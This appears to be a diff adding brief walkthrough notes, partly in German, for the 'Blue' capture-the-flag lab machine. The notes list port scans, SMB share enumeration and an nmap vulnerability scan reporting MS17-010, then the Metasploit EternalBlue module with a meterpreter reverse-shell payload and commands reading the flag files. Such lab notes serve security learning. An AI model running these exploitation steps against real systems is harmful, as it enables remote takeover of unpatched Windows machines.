@@ -1,0 +1,36 @@
+Blue
+================
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[...]
+-------------------------------
+- smbclient -L blue.htb
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Share           Disk
+        Users           Disk
+
+-  smbclient //blue.htb/Share (leer)
+-  smbclient //blue.htb/Users (leere Verzeichnisse)
+-  nmap -A -sV --script="smb-vuln*" blue.htb -Pn -p 139,445
+   =>  smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+
+
+- use exploit/windows/smb/ms17_010_eternalblue
+- set payload windows/x64/meterpreter/reverse_tcp
+- cat C:\Users\haris\Desktop\user.txt
+- cat C:\Users\haris\Administrator\root.txt
